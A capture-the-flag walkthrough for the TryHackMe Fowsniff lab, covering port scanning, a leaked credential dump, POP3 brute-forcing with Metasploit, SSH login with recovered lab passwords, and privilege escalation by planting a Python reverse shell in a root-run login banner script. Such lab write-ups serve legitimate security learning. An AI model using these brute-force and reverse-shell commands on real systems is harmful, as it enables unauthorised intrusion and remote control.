# [Fowsniff CTF](https://tryhackme.com/room/ctf)

> Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

## Scanning

scan the target

```
nmap -sS -sV -sC -T4 10.10.94.126
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c1ed36f0-3f03-4a8c-abf7-3b3d7d118176)

there are 4 open ports (22 ssh, 80 http, 110 pop3, 143 imap)

## HTTP

view the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0b7e7111-383e-48c6-8e2c-962ffce95232)

nothing on robots.txt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7278ec32-1326-4bec-8dee-bd7774013bd6)

## Enumeration

scan the directory of web server

```
gobuster dir -u http://10.10.94.126 -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fc170ec0-6809-45f5-9f25-001a33ba7273)

check security.txt, it seem website has attacked by a hacker

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4d45df4d-4867-406d-85aa-23db96f400dc)

search on google i found a twitter of attacker published the data of company

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/86b61e90-be9a-489a-ae16-48d94e6775ac)

click on pastebin, we have the credentials dump

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d18c20e6-ef8a-4be9-9da3-af24216388c4)

i copied it

```
cut -d ":" -f2 dump.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a037c8bb-236e-48fb-a38f-95f22a7d1cd0)

crack it with crackstation

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3c4abf86-2e9f-4584-8a2a-c8925591d571)

save it to 2 lists user.txt and pass.txt

brute force the POP3 service with metasploit

```
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS 10.10.94.126
set USER_FILE user.txt
set PASS_FILE pass.txt
set VERBOSE false
set STOP_ON_SUCCESS true
run
```

we got the real credential

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9f883b62-5200-42dd-a326-3096a52f6b58)

## Exploitation

connect to pop3 server in port 110

```
telnet 10.10.94.126 110
user seina
pass scoobydoo2
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/66615f91-ca3e-4f2a-90b3-f77dfca6608c)

```
list
```

i see 2 messages

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/dca1402c-44cc-4422-847f-ecebf3a8ab5e)

```
retr 1
```

it real a tmp password for ssh `S1ck3nBluff+secureshell`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ddbb42ca-f9d8-434d-b571-4adcfb688bfb)

```
retr 2
```

baksteen says he will read the message later

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/80e3f86c-e443-4255-adb2-60d74f8abf50)

so, he didn't change the tmp password

```
ssh baksteen@10.10.94.126
S1ck3nBluff+secureshell
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3f4660cf-7353-4f90-8b3a-3ef1932e342a)

## Privilege Escalation

the user is on an suspicious group call `users`, let find something interesting of that

```
find / -group users -type f 2>/dev/null
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/12c6c67e-c191-43a5-b5e1-c4030c7cd138)

it look like the ssh banner when we login

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d3af80ca-773f-49f4-9578-dc11dab4e1b6)

you can check the /etc/update-motd.d/00-header run our banner as root

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4e8b5be1-391f-41b5-8174-a6dc4fa088af)

insert a reverse shell to our file

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.18.37.45,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

exit our SSH session and set up a listener

```
nc -nlvp 1234
```

ssh again and we got our reverse shell

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/34625a3e-03b2-4c80-854a-e5db0aa323e7)
